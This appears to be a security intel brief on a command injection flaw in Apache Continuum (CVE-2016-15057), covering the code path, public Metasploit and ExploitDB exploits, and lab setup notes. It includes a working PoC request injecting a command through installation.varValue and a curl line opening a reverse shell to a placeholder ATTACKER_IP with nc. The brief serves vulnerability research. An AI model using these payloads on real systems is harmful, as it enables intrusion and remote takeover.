# Intel Brief: CVE-2016-15057

## CVE ID
CVE-2016-15057

## Affected Software
- **Name**: Apache Continuum
- **Vendor**: Apache Software Foundation
- **Package**: `org.apache.continuum:continuum` (Maven)
- **Affected Versions**: All versions (up to and including 1.4.2, the latest release)
- **Project Status**: RETIRED — no fix will be released

## CVSS Score
- **Score**: 9.9 (Critical)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
- **EPSS**: 37.9% (97.1st percentile)

## CWE Classification
- **CWE-77**: Improper Neutralization of Special Elements used in a Command ('Command Injection')

## Description
Apache Continuum is a retired continuous integration server. A command injection vulnerability exists in the **installations management functionality** (Struts action `saveInstallation`). The `installation.varValue` POST parameter is used to specify a filesystem path (e.g., JAVA_HOME) for build tool installations. This value is later passed, unsanitized, to `ShellCommandHelper.executeShellCommand()` which uses plexus-utils `Commandline` class. On Linux, plexus-utils wraps command execution in `/bin/sh -c`, causing shell metacharacters (backticks, semicolons, pipes) in the `varValue` to be interpreted as commands.

An attacker can inject arbitrary OS commands by submitting a crafted `installation.varValue` containing backtick command substitution (e.g., `` `malicious_command` ``).

## Vulnerability Details

### Attack Vector
- **Endpoint**: `POST /continuum/saveInstallation.action`
- **Vulnerable Parameter**: `installation.varValue`
- **Injection Type**: Shell command injection via backtick substitution
- **Authentication**: The Struts action implements `SecureAction` requiring `CONTINUUM_MANAGE_INSTALLATIONS` role (PR:L in CVSS). However, public PoCs demonstrate exploitation against default installations, suggesting the default setup may not enforce auth or has weak default credentials.

### Vulnerable Code Path
1. **Entry Point**: `InstallationAction.save()` (`continuum-webapp/.../web/action/admin/InstallationAction.java`)
   - Struts binds POST parameters to `Installation` model object via OGNL
   - Calls `installationService.add(installation, automaticProfile)`

2. **Storage**: `DefaultInstallationService.add()` (`continuum-commons/.../installation/DefaultInstallationService.java`)
   - Stores the installation with tainted `varValue` to database

3. **Trigger**: `DefaultInstallationService.getJavaVersionInfo(String homePath)` (line 339-355)
   - Constructs executable: `homePath + "/bin/java"` where `homePath` = `installation.getVarValue()`
   - Calls: `shellCommandHelper.executeShellCommand(null, executable, new String[]{"-version"}, ...)`

4. **Sink**: `DefaultShellCommandHelper.executeShellCommand()` (line 171-188)
   - Uses plexus-utils `Commandline` class → `CommandLineUtils.executeCommandLine()`
   - plexus-utils 1.5.11 wraps execution in `/bin/sh -c`, enabling shell metacharacter interpretation

### PoC Request
```http
POST /continuum/saveInstallation.action HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

installation.name=test123&installation.type=jdk&installation.varValue=`id`
```

For a reverse shell:
```bash
curl http://target:8080/continuum/saveInstallation.action \
  --data 'installation.name=pwned&installation.type=jdk&installation.varValue=`nc ATTACKER_IP 4444 -e /bin/sh`'
```

## Repository URL
- **GitHub**: https://github.com/apache/continuum
- **Clone URL**: https://github.com/apache/continuum.git

## Vulnerable Version
- **Tag**: `continuum-1.4.2` (latest stable release, currently checked out)
- **Commit**: `3696e262a` (tag commit for 1.4.2)
- All prior versions are also vulnerable

## Fix Commit
- **No fix exists**. The project was retired before a fix could be released.
- JIRA issue CONTINUUM-2769 was filed (June 30, 2016) with target fix version 1.5.1, but 1.5.1 was never released.
- The latest tag is `continuum-1.4.3` but it does NOT contain a fix for this issue (it's a minor release notes correction).

## Patched Version
- **None** — project is retired and unsupported

## Build System
- **Build Tool**: Apache Maven (pom.xml, multi-module project)
- **Language**: Java
- **Packaging**: WAR (webapp) + standalone binary distribution with embedded Jetty

### Pre-built Binary Available
A pre-built binary distribution is available (STRONGLY RECOMMENDED over building from source):
- **URL**: `https://archive.apache.org/dist/continuum/binaries/apache-continuum-1.4.2-bin.tar.gz` (27.6 MB)
- **WAR**: `https://archive.apache.org/dist/continuum/binaries/apache-continuum-1.4.2.war`
- Run with: `bin/continuum console` from extracted directory
- Default port: **8080**
- Web context: `/continuum`

### Key Dependencies (for building from source)
- Java JDK 6 or 7 (old Maven 2.x era project)
- Maven 2.0.7+
- Jetty 8.1.7 (embedded)
- Struts 2.3.16.3
- Spring 2.5.6
- plexus-utils 1.5.11 (contains the shell command helper)
- Codehaus Redback 1.3-M3 (security/RBAC)

## Public Exploits

### 1. Metasploit Module (VERIFIED, RELIABLE)
- **Module**: `exploit/linux/http/apache_continuum_cmd_exec`
- **Source**: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/apache_continuum_cmd_exec.rb
- **Mechanism**: POSTs to `/continuum/saveInstallation.action` with command in `installation.varValue` wrapped in backticks
- **Parameters**: `installation.name` (random), `installation.type` = "jdk", `installation.varValue` = `` `command` ``
- **Check method**: Queries `/continuum/about.action` to verify target
- **Uses CmdStager** for multi-stage payload delivery

### 2. ExploitDB-39886 (Original Disclosure)
- **Title**: Apache Continuum 1.4.2 - Multiple Vulnerabilities
- **URL**: https://www.exploit-db.com/exploits/39886
- **Published**: 2016-06-06
- **Contains**: Command injection PoC + Reflected XSS

### 3. ExploitDB-39945 (Metasploit Module)
- **Title**: Apache Continuum - Arbitrary Command Execution (Metasploit)
- **URL**: https://www.exploit-db.com/exploits/39945
- **Published**: 2016-06-14

### Exploit Quality Assessment
- The Metasploit module is peer-reviewed and verified — safe to reference
- No trojans detected in the known exploits
- The vulnerability is straightforward command injection — PoC is simple to write from scratch

## References
- **Apache Mailing List**: https://lists.apache.org/thread/hbvf1ztqw2kv51khvzm5nk3mml3nm4z1
- **oss-security**: http://www.openwall.com/lists/oss-security/2026/01/26/1
- **GHSA**: https://github.com/advisories/GHSA-77p9-w6pj-rmvg
- **JIRA**: https://issues.apache.org/jira/browse/CONTINUUM-2769
- **Apache Security Page**: https://continuum.apache.org/security.html
- **NVD**: https://nvd.nist.gov/vuln/detail/CVE-2016-15057
- **Rapid7**: https://www.rapid7.com/db/modules/exploit/linux/http/apache_continuum_cmd_exec/
- **Binary Archive**: https://archive.apache.org/dist/continuum/binaries/
- **Getting Started**: https://continuum.apache.org/docs/1.4.2/getting-started.html

## Lab Build Notes
- **RECOMMENDED APPROACH**: Use the pre-built binary distribution (`apache-continuum-1.4.2-bin.tar.gz`) rather than building from source. The project uses very old Maven/Spring/Plexus dependencies that are difficult to resolve.
- Requires **Java 7** (JDK 1.7) — the application uses APIs from that era and may not work with Java 8+ due to removed APIs.
- Default port: **8080**, context path: `/continuum`
- After first start, access `http://localhost:8080/continuum/` to complete initial setup (create admin user)
- The vulnerable endpoint is at `/continuum/saveInstallation.action`
- For PoC verification: after submitting the crafted installation, the injected command may execute immediately during save, or when the system attempts to validate the installation path by running `<varValue>/bin/java -version`

## Key Source Files (for vulnerability analysis)
1. `continuum-webapp/src/main/java/org/apache/maven/continuum/web/action/admin/InstallationAction.java` — Struts action handler
2. `continuum-commons/src/main/java/org/apache/continuum/installation/DefaultInstallationService.java` — Installation service (stores + validates)
3. `continuum-api/src/main/java/org/apache/continuum/utils/shell/DefaultShellCommandHelper.java` — Shell command execution sink
4. `continuum-webapp/src/main/resources/struts.xml` — Struts action mappings
5. `continuum-jetty/src/main/conf/jetty.xml` — Jetty server configuration (port 8080)
